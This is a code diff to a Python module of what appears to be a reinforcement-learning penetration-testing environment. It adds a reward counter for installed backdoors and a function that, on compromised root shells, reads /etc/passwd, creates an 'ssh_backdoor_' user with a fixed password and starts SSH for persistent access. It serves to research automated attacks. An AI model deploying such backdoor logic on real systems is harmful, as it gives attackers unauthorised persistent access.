@@ -4,6 +4,7 @@ import xml.etree.ElementTree as ET
 import time
 import paramiko
 import telnetlib
+import random
 from ftplib import FTP
 from gym_pycr_pwcrack.dao.network.env_config import EnvConfig
 from gym_pycr_pwcrack.dao.action.action import Action
@@ -772,7 +773,8 @@ class ClusterUtil:
         :return: s', reward
         """
         total_new_ports, total_new_os, total_new_vuln, total_new_machines, total_new_shell_access, \
-        total_new_root, total_new_flag_pts, total_new_logged_in, total_new_tools_installed = 0, 0, 0, 0, 0, 0, 0, 0, 0
+        total_new_root, total_new_flag_pts, total_new_logged_in, total_new_tools_installed, \
+        total_new_backdoors_installed = 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
         new_m_obs = []
 
         for host in scan_result.hosts:
@@ -781,7 +783,7 @@ class ClusterUtil:
 
         new_machines_obs, total_new_ports, total_new_os, total_new_vuln, total_new_machines, \
         total_new_shell_access, total_new_flag_pts, total_new_root, total_new_osvdb_vuln_found, total_new_logged_in, \
-        total_new_tools_installed = \
+        total_new_tools_installed, total_new_backdoors_installed = \
             EnvDynamicsUtil.merge_new_obs_with_old(s.obs_state.machines, new_m_obs, env_config=env_config)
         s_prime = s
         s_prime.obs_state.machines = new_machines_obs
@@ -798,6 +800,7 @@ class ClusterUtil:
                                                  num_new_osvdb_vuln_found=total_new_osvdb_vuln_found,
                                                  num_new_logged_in=total_new_logged_in,
                                                  num_new_tools_installed=total_new_tools_installed,
+                                                 num_new_backdoors_installed=total_new_backdoors_installed,
                                                  cost=a.cost,
                                                  env_config=env_config)
         return s_prime, reward
@@ -881,11 +884,11 @@ class ClusterUtil:
         :param env_config: environment config
         :return: s_prime, total_new_ports, total_new_os, total_new_vuln, total_new_machines, \
                    total_new_shell_access, total_new_flag_pts, total_new_root, cost, new_conn, total_new_osvdb_found,
-                   total_new_logged_in, total_new_tools_installed
+                   total_new_logged_in, total_new_tools_installed, total_new_backdoors_installed
         """        
         total_new_ports, total_new_os, total_new_vuln, total_new_machines, total_new_shell_access, \
         total_new_root, total_new_flag_pts, total_new_osvdb_vuln_found, total_new_logged_in, \
-        total_new_tools_installed = 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
+        total_new_tools_installed, total_new_backdoors_installed = 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
         total_cost = 0
         target_machine = None
         non_used_credentials = []
@@ -993,14 +996,14 @@ class ClusterUtil:
             if target_machine is not None:
                 new_machines_obs, total_new_ports, total_new_os, total_new_vuln, total_new_machines, \
                 total_new_shell_access, total_new_flag_pts, total_new_root, total_new_osvdb_vuln_found, \
-                total_new_logged_in, total_new_tools_installed = \
+                total_new_logged_in, total_new_tools_installed, total_new_backdoors_installed = \
                     EnvDynamicsUtil.merge_new_obs_with_old(s.obs_state.machines, [target_machine],
                                                            env_config=env_config)
                 s_prime.obs_state.machines = new_machines_obs
 
             return s_prime, total_new_ports, total_new_os, total_new_vuln, total_new_machines, \
                    total_new_shell_access, total_new_flag_pts, total_new_root, total_new_osvdb_vuln_found, \
-                   total_new_logged_in, total_new_tools_installed, total_cost, False
+                   total_new_logged_in, total_new_tools_installed, total_new_backdoors_installed, total_cost, False
 
         # If not logged in and there are credentials, setup a new connection
         connected = False
@@ -1054,7 +1057,7 @@ class ClusterUtil:
             target_machine.root = root
             new_machines_obs, total_new_ports, total_new_os, total_new_vuln, total_new_machines, \
             total_new_shell_access, total_new_flag_pts, total_new_root, total_new_osvdb_vuln_found, \
-            total_new_logged_in, total_new_tools_installed = \
+            total_new_logged_in, total_new_tools_installed, total_new_backdoors_installed = \
                 EnvDynamicsUtil.merge_new_obs_with_old(s.obs_state.machines, [target_machine], env_config=env_config)
             s_prime.obs_state.machines = new_machines_obs
         else:
@@ -1063,7 +1066,7 @@ class ClusterUtil:
 
         return s_prime, total_new_ports, total_new_os, total_new_vuln, total_new_machines, \
             total_new_shell_access, total_new_flag_pts, total_new_root, total_new_osvdb_vuln_found, \
-               total_new_logged_in, total_new_tools_installed, total_cost, True
+               total_new_logged_in, total_new_tools_installed, total_new_backdoors_installed, total_cost, True
 
 
     @staticmethod
@@ -1585,7 +1588,7 @@ class ClusterUtil:
         """
         total_new_ports, total_new_os, total_new_vuln, total_new_machines, total_new_shell_access, \
         total_new_root, total_new_flag_pts, total_new_osvdb_vuln_found, total_new_logged_in, \
-        total_new_tools_installed = 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
+        total_new_tools_installed, total_new_backdoors_installed = 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
         m_obs = None
 
         for m in s.obs_state.machines:
@@ -1598,7 +1601,7 @@ class ClusterUtil:
 
         new_machines_obs, total_new_ports, total_new_os, total_new_vuln, total_new_machines, \
         total_new_shell_access, total_new_flag_pts, total_new_root, total_new_osvdb_vuln_found, total_new_logged_in, \
-        total_new_tools_installed = \
+        total_new_tools_installed, total_new_backdoors_installed = \
             EnvDynamicsUtil.merge_new_obs_with_old(s.obs_state.machines, [m_obs], env_config=env_config)
         s_prime = s
         s_prime.obs_state.machines = new_machines_obs
@@ -1615,6 +1618,7 @@ class ClusterUtil:
                                                  num_new_osvdb_vuln_found=total_new_osvdb_vuln_found,
                                                  num_new_logged_in=total_new_logged_in,
                                                  num_new_tools_installed=total_new_tools_installed,
+                                                 num_new_backdoors_installed=total_new_backdoors_installed,
                                                  cost=a.cost,
                                                  env_config=env_config)
         return s_prime, reward
@@ -1921,7 +1925,7 @@ class ClusterUtil:
                         cmd = a.cmd[0] + "\n"
                         start = time.time()
                         c.conn.write(cmd.encode())
-                        response = c.conn.read_until(constants.TELNET.PROMPT, timeout=5)
+                        response = c.conn.read_until(constants.TELNET.PROMPT, timeout=25)
                         response = response.decode()
                         end = time.time()
                         total_time = end - start
@@ -1950,7 +1954,7 @@ class ClusterUtil:
                 total_cost += telnet_cost
         new_machines_obs, total_new_ports, total_new_os, total_new_vuln, total_new_machines, \
         total_new_shell_access, total_new_flag_pts, total_new_root, total_new_osvdb_vuln_found, total_new_logged_in, \
-        total_new_tools_installed = \
+        total_new_tools_installed, total_new_backdoors_installed = \
             EnvDynamicsUtil.merge_new_obs_with_old(s.obs_state.machines, new_machines_obs, env_config=env_config)
         s_prime = s
         s_prime.obs_state.machines = new_machines_obs
@@ -1964,6 +1968,7 @@ class ClusterUtil:
                                                  num_new_osvdb_vuln_found=total_new_osvdb_vuln_found,
                                                  num_new_logged_in=total_new_logged_in,
                                                  num_new_tools_installed=total_new_tools_installed,
+                                                 num_new_backdoors_installed=total_new_backdoors_installed,
                                                  cost=total_cost,
                                                  env_config=env_config)
         return s, reward, False
@@ -2077,10 +2082,10 @@ class ClusterUtil:
                     break
 
                 # Update state with scan result
-                if merged_scan_result is not None:
+                if merged_scan_result is not None and scan_result is not None:
                     merged_scan_result = ClusterUtil.merge_nmap_scan_results(scan_result_1=merged_scan_result,
                                                                              scan_result_2=scan_result)
-                else:
+                elif merged_scan_result is None:
                     merged_scan_result = scan_result
 
         if env_config.use_nmap_cache:
@@ -2088,3 +2093,181 @@ class ClusterUtil:
         s_prime, reward = ClusterUtil.merge_nmap_scan_result_with_state(scan_result=merged_scan_result, s=s, a=a,
                                                                         env_config=env_config)
         return s_prime, reward, False
+
+    @staticmethod
+    def _check_if_ssh_server_is_running(conn) -> bool:
+        """
+        Checks if an ssh server is running on the machine
+
+        :param conn: the connection to use for the command
+        :return: True if server is running, else false
+        """
+        cmd= "service ssh status"
+        outdata, errdata, total_time = ClusterUtil.execute_ssh_cmd(cmd=cmd, conn=conn)
+        return "is running" in outdata.decode() or "is running" in errdata.decode()
+
+    @staticmethod
+    def _list_all_users(conn) -> bool:
+        """
+        List all users on a machine
+
+        :param conn: the connection to user for the command
+        :return: list of users
+        """
+        cmd = "cut -d: -f1 /etc/passwd"
+        outdata, errdata, total_time = ClusterUtil.execute_ssh_cmd(cmd=cmd, conn=conn)
+        outdata = outdata.decode()
+        users = outdata.split("\n")
+        return users
+
+    @staticmethod
+    def execute_ssh_backdoor_helper(s: EnvState, a: Action, env_config: EnvConfig) -> Tuple[EnvState, int, bool]:
+        """
+        Uses compromised machines with root access to setup SSH backdoor
+
+        :param s: the current state
+        :param a: the action to take
+        :param env_config: the environment configuration
+        :return: s_prime, reward, done
+        """
+        username = "ssh_backdoor_" + str(random.randint(0, 100000))
+        pw = "pycr_pwcrack"
+        new_machines_obs = []
+        total_cost = 0
+        for machine in s.obs_state.machines:
+            new_m_obs = MachineObservationState(ip=machine.ip)
+            backdoor_created = False
+            if machine.logged_in and machine.root and machine.tools_installed and not machine.backdoor_installed:
+
+                # Check cached connections
+                for cr in s.cached_backdoor_credentials.values():
+                    if (machine.ip, cr.username, cr.port) in s.cached_ssh_connections:
+                        conn = s.cached_ssh_connections[(machine.ip, cr.username, cr.port)]
+                        connection_dto = ConnectionObservationState(conn=conn, username=cr.username,
+                                                                    root=machine.root,
+                                                                    service=constants.SSH.SERVICE_NAME,
+                                                                    port=cr.port)
+                        new_m_obs.shell_access_credentials.append(credential)
+                        new_m_obs.backdoor_credentials.append(credential)
+                        new_m_obs.ssh_connections.append(connection_dto)
+                        new_m_obs.backdoor_installed = True
+                        new_machines_obs.append(new_m_obs)
+                        backdoor_created = True
+
+                if backdoor_created:
+                    break
+
+                # Try first to setup new ssh connections
+                ssh_root_connections = list(filter(lambda x: x.root, machine.ssh_connections))
+                ssh_cost = 0
+                for c in ssh_root_connections:
+                    try:
+                        users = ClusterUtil._list_all_users(c.conn)
+                        user_exists = False
+                        for user in users:
+                            if "ssh_backdoor" in user:
+                                user_exists = True
+                                username = user
+
+                        if not user_exists:
+                            # Create user
+                            create_user_cmd = a.cmd[1].format(username, pw, username)
+                            outdata, errdata, total_time = ClusterUtil.execute_ssh_cmd(cmd=create_user_cmd, conn=c.conn)
+                            ssh_cost += float(total_time)
+
+                        credential = Credential(username=username, pw=pw, port=22, service="ssh")
+
+                        # Start SSH Server
+                        ssh_running = ClusterUtil._check_if_ssh_server_is_running(c.conn)
+                        if not ssh_running:
+                            start_ssh_cmd = a.cmd[0]
+                            outdata, errdata, total_time = ClusterUtil.execute_ssh_cmd(cmd=start_ssh_cmd, conn=c.conn)
+                            ssh_cost += float(total_time)
+
+                        # Create SSH connection
+                        new_m_obs.shell_access_credentials.append(credential)
+                        new_m_obs.backdoor_credentials.append(credential)
+                        a.ip = machine.ip
+                        connected, users, target_connections, ports, total_time, non_failed_credentials = \
+                            ClusterUtil._ssh_setup_connection(a=a, env_config=env_config, credentials=[credential])
+                        ssh_cost += total_time
+
+                        connection_dto = ConnectionObservationState(conn=target_connections[0],
+                                                                    username=credential.username,
+                                                                    root=machine.root,
+                                                                    service=constants.SSH.SERVICE_NAME,
+                                                                    port=credential.port)
+                        new_m_obs.ssh_connections.append(connection_dto)
+                        new_m_obs.backdoor_installed = True
+                        new_machines_obs.append(new_m_obs)
+
+                        backdoor_created = True
+                    except Exception as e:
+                        print("Exception: {}".format(str(e)))
+
+                    if backdoor_created:
+                        break
+
+                total_cost += ssh_cost
+
+                # Telnet connections
+                telnet_cost = 0
+                if backdoor_created:
+                    break
+                telnet_root_connections = filter(lambda x: x.root, machine.telnet_connections)
+                for c in telnet_root_connections:
+                    try:
+                        # Create user
+                        create_user_cmd = a.cmd[1].format(username, pw, username) + "\n"
+                        c.conn.write(create_user_cmd.encode())
+                        response = c.conn.read_until(constants.TELNET.PROMPT, timeout=5)
+
+                        # Start SSH Server
+                        start_ssh_cmd = a.cmd[0] + "\n"
+                        c.conn.write(start_ssh_cmd.encode())
+                        response = c.conn.read_until(constants.TELNET.PROMPT, timeout=5)
+
+                        # Create SSH connection
+                        new_m_obs.shell_access_credentials.append(credential)
+                        new_m_obs.backdoor_credentials.append(credential)
+                        a.ip = machine.ip
+                        connected, users, target_connections, ports, total_time, non_failed_credentials = \
+                            ClusterUtil._ssh_setup_connection(a=a, env_config=env_config, credentials=[credential])
+                        ssh_cost += total_time
+                        connection_dto = ConnectionObservationState(conn=target_connections[0],
+                                                                    username=credential.username,
+                                                                    root=machine.root,
+                                                                    service=constants.SSH.SERVICE_NAME,
+                                                                    port=credential.port)
+                        new_m_obs.ssh_connections.append(connection_dto)
+                        new_m_obs.backdoor_installed = True
+                        new_machines_obs.append(new_m_obs)
+                        backdoor_created = True
+                        new_machines_obs.append(new_m_obs)
+                    except:
+                        pass
+                    if backdoor_created:
+                        break
+
+                total_cost += telnet_cost
+        new_machines_obs, total_new_ports, total_new_os, total_new_vuln, total_new_machines, \
+        total_new_shell_access, total_new_flag_pts, total_new_root, total_new_osvdb_vuln_found, total_new_logged_in, \
+        total_new_tools_installed, total_new_backdoors_installed = \
+            EnvDynamicsUtil.merge_new_obs_with_old(s.obs_state.machines, new_machines_obs, env_config=env_config)
+        s_prime = s
+        s_prime.obs_state.machines = new_machines_obs
+
+        reward = EnvDynamicsUtil.reward_function(num_new_ports_found=total_new_ports, num_new_os_found=total_new_os,
+                                                 num_new_cve_vuln_found=total_new_vuln,
+                                                 num_new_machines=total_new_machines,
+                                                 num_new_shell_access=total_new_shell_access,
+                                                 num_new_root=total_new_root,
+                                                 num_new_flag_pts=total_new_flag_pts,
+                                                 num_new_osvdb_vuln_found=total_new_osvdb_vuln_found,
+                                                 num_new_logged_in=total_new_logged_in,
+                                                 num_new_tools_installed=total_new_tools_installed,
+                                                 num_new_backdoors_installed=total_new_backdoors_installed,
+                                                 cost=total_cost,
+                                                 env_config=env_config)
+        return s, reward, False
+
